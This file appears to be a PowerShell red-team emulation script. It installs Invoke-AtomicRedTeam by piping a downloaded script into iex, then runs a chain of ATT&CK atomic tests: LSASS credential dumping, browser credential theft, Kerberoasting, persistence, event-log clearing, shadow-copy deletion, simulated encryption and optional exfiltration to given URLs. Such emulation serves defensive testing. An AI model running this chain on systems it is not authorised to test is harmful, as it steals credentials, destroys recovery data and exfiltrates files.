#Requires -Version 5.1
[CmdletBinding()]
param(
  [string]$AtomicRoot = "C:\AtomicRedTeam",
  [string]$OutCsv = "$env:USERPROFILE\Desktop\atomic_run_log.csv",
  [string]$ArtifactsDir = "$env:USERPROFILE\Desktop\atomic_outputs",
  [int]$OutputChars = 800,                 # how many chars to include in CSV
  [switch]$IncludeDestructive,
  [switch]$DiscoveryOnly,
  [string]$ExfilHttpUrl,
  [string]$ExfilFtpUrl
)


$ErrorActionPreference = 'Stop'

function Ensure-InvokeAtomic {
  if (-not (Get-Command Invoke-AtomicTest -ErrorAction SilentlyContinue)) {
    Write-Host "[*] Installing Invoke-AtomicRedTeam..."
    $installUrl = 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install/install-atomicredteam.ps1'
    iwr $installUrl -UseBasicParsing | iex
    Install-AtomicRedTeam -InstallPath $AtomicRoot -Force | Out-Null
  } else {
    Write-Host "[*] Invoke-AtomicTest found."
  }
}

function Run-Atomic {
  param(
    [Parameter(Mandatory=$true)][string]$Technique,
    [int[]]$Tests,
    [hashtable]$InputArgs,
    [string]$Note,
    [switch]$Dangerous
  )

  if ($Dangerous -and -not $IncludeDestructive) {
    Write-Host "[-] Skipping $Technique ($Note) because -IncludeDestructive was not set." -ForegroundColor Yellow
    return
  }

  # Default to all/first test if not specified
  if (-not $Tests -or $Tests.Count -eq 0) {
    try { $Tests = @(1) } catch { $Tests = @(1) }
  }

  # safe logfile name
  $safeNote = ($Note -replace '[^a-zA-Z0-9_\-\. ]','_') -replace '\s+','_'
  $logPath  = Join-Path $ArtifactsDir ("{0}_{1}_{2}.log" -f $Technique, ($Tests -join '-'), (Get-Date -Format 'yyyyMMdd-HHmmss'))

  $tsStart = Get-Date
  $status  = "Unknown"
  $msg     = ""
  $snippet = ""

  try {
    Write-Host "[>] $Technique — $Note"

    # Start transcript to capture EVERYTHING Invoke-AtomicTest prints
    try { Stop-Transcript | Out-Null } catch {}
    Start-Transcript -Path $logPath -Force | Out-Null

    # Prereqs + Execute
    Invoke-AtomicTest $Technique -TestNumbers $Tests -GetPrereqs -PathToAtomicsFolder "$AtomicRoot\atomics" -InputArgs $InputArgs -ErrorAction Stop | Out-Null
    Invoke-AtomicTest $Technique -TestNumbers $Tests -PathToAtomicsFolder "$AtomicRoot\atomics" -InputArgs $InputArgs -ErrorAction Stop | Out-Null

    $status = "Executed"
  } catch {
    $status = "Error"
    $msg = $_.Exception.Message
    Write-Warning "  ! $Technique failed: $msg"
  } finally {
    try { Stop-Transcript | Out-Null } catch {}

    $tsEnd = Get-Date

    # Read transcript and include a short tail in CSV
    if (Test-Path $logPath) {
      $raw = Get-Content -Path $logPath -Raw -ErrorAction SilentlyContinue
      # strip transcript headers to keep it compact (optional)
      $clean = $raw -replace '(?s)\*{5,}.*?\*{5,}',''
      if ($clean.Length -gt $OutputChars) {
        $snippet = $clean.Substring([Math]::Max(0, $clean.Length - $OutputChars))
      } else {
        $snippet = $clean
      }
      # single-line it for CSV readability
      $snippet = ($snippet -replace '\s+',' ').Trim()
    }

    $row = [pscustomobject]@{
      Timestamp   = $tsStart.ToString("s")
      Technique   = $Technique
      Tests       = ($Tests -join ',')
      Note        = $Note
      Status      = $status
      DurationSec = [int]($tsEnd - $tsStart).TotalSeconds
      Message     = $msg
      OutputPath  = $logPath
      OutputSnippet = $snippet
    }
    $append = Test-Path $OutCsv
    $row | Export-Csv -Path $OutCsv -NoTypeInformation -Append:$append
  }
}


# ----------------- Bootstrap -----------------
Ensure-InvokeAtomic
$null = New-Item -ItemType Directory -Force -Path (Split-Path $OutCsv) -ErrorAction SilentlyContinue
$null = New-Item -ItemType Directory -Force -Path $ArtifactsDir -ErrorAction SilentlyContinue




Write-Host "[*] Results will be logged to: $OutCsv`n"

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$zip = Join-Path (Split-Path $OutCsv) ("atomic_outputs_{0}.zip" -f $stamp)
if (Test-Path $zip) { Remove-Item $zip -Force }
Compress-Archive -Path (Join-Path $ArtifactsDir '*') -DestinationPath $zip -Force
Write-Host "[*] Collected logs zipped at: $zip"


# ----------------- Chain definition -----------------
# NOTE: TestNumbers are the most common Windows atomics. If a number isn’t present in your local atomics set,
# the runner will try prerequisites and then attempt the default test(1). You can edit/expand as needed.

$chain = @()

# ---- Discovery ----
$chain += [pscustomobject]@{ T='T1082'      ; N='System Information Discovery'            ; Tests=@(1) ; Args=@{} ; Danger=$false }
$chain += [pscustomobject]@{ T='T1033'      ; N='Account Discovery (whoami /all)'         ; Tests=@(1) ; Args=@{} ; Danger=$false }
$chain += [pscustomobject]@{ T='T1046'      ; N='Network Service Discovery (PowerShell)'  ; Tests=@(1) ; Args=@{} ; Danger=$false }
$chain += [pscustomobject]@{ T='T1087.002'  ; N='Domain Account Discovery'                ; Tests=@(1) ; Args=@{} ; Danger=$false }
$chain += [pscustomobject]@{ T='T1482'      ; N='Domain Trust Discovery'                  ; Tests=@(1) ; Args=@{} ; Danger=$false }

if (-not $DiscoveryOnly) {

  # ---- C2 / Ingress Tool Transfer ----
  $dlFile = "$env:TEMP\atomic-download.bin"
  $chain += [pscustomobject]@{ T='T1105'    ; N='Ingress Tool Transfer (certutil download)'; Tests=@(1) ; Args=@{ input_url="https://example.com/file.bin"; output_file=$dlFile } ; Danger=$false }

  # ---- Credential Access ----
  $chain += [pscustomobject]@{ T='T1558.003'; N='Kerberoasting (set of SPNs)'             ; Tests=@(1) ; Args=@{} ; Danger=$false }
  $chain += [pscustomobject]@{ T='T1003.001'; N='OS Credential Dumping (LSASS via comsvcs)'; Tests=@(1) ; Args=@{} ; Danger=$true }   # destructive-ish
  $chain += [pscustomobject]@{ T='T1555.003'; N='Credentials from Web Browsers'           ; Tests=@(1) ; Args=@{} ; Danger=$false }

  # ---- Lateral Movement (local simulation style atomics) ----
  # These atomics simulate or prep the behavior without requiring remote creds.
  $chain += [pscustomobject]@{ T='T1047'    ; N='WMI Execution (local/sim)'               ; Tests=@(1) ; Args=@{} ; Danger=$false }
  $chain += [pscustomobject]@{ T='T1021.006'; N='WinRM (simulation)'                      ; Tests=@(1) ; Args=@{} ; Danger=$false }
  $chain += [pscustomobject]@{ T='T1021.002'; N='SMB/PSExec (simulation)'                 ; Tests=@(1) ; Args=@{} ; Danger=$false }

  # ---- Defense Evasion ----
  $chain += [pscustomobject]@{ T='T1218.011'; N='Signed Binary Proxy Exec (rundll32)'     ; Tests=@(1) ; Args=@{} ; Danger=$false }
  $chain += [pscustomobject]@{ T='T1112'    ; N='Modify Registry (WDigest flip)'          ; Tests=@(1) ; Args=@{} ; Danger=$true }   # configuration tamper
  $chain += [pscustomobject]@{ T='T1070.001'; N='Clear Windows Event Logs'                ; Tests=@(1) ; Args=@{} ; Danger=$true }   # destructive

  # ---- Persistence ----
  $chain += [pscustomobject]@{ T='T1053.005'; N='Scheduled Task (daily)'                  ; Tests=@(1) ; Args=@{} ; Danger=$false }
  $chain += [pscustomobject]@{ T='T1547.001'; N='Run Key Persistence'                     ; Tests=@(1) ; Args=@{} ; Danger=$false }
  $chain += [pscustomobject]@{ T='T1136.001'; N='Create Local Account'                    ; Tests=@(1) ; Args=@{} ; Danger=$false }
  $chain += [pscustomobject]@{ T='T1098'    ; N='Account Manipulation (add to group)'     ; Tests=@(1) ; Args=@{} ; Danger=$false }

  # ---- Collection ----
  $chain += [pscustomobject]@{ T='T1056.001'; N='Keylogging (simulation)'                 ; Tests=@(1) ; Args=@{} ; Danger=$false }
  $chain += [pscustomobject]@{ T='T1560.001'; N='Archive Collected Data (7-Zip)'          ; Tests=@(1) ; Args=@{} ; Danger=$false }

  # ---- Exfiltration ----
  if ($ExfilHttpUrl) { $chain += [pscustomobject]@{ T='T1041'; N='Exfil over C2/HTTP (sim)'; Tests=@(1); Args=@{ url=$ExfilHttpUrl } ; Danger=$false } }
  if ($ExfilFtpUrl ) { $chain += [pscustomobject]@{ T='T1048'; N='Exfil over Alternative Protocol (FTP)'; Tests=@(1); Args=@{ url=$ExfilFtpUrl } ; Danger=$false } }

  # ---- Impact (Ransomware behaviors) ----
  $chain += [pscustomobject]@{ T='T1490'    ; N='Inhibit System Recovery (vssadmin/bcdedit)'; Tests=@(1) ; Args=@{} ; Danger=$true }  # destructive
  $chain += [pscustomobject]@{ T='T1486'    ; N='Data Encrypted for Impact (simulated)'   ; Tests=@(1) ; Args=@{} ; Danger=$true }  # potentially destructive
}

# ----------------- Execute chain -----------------
$idx = 1
foreach ($step in $chain) {
  Run-Atomic -Technique $step.T -Tests $step.Tests -InputArgs $step.Args -Note ("{0}. {1}" -f $idx, $step.N) -Dangerous:([bool]$step.Danger)
  $idx++
}

Write-Host "`n[✓] Chain complete. CSV log: $OutCsv"
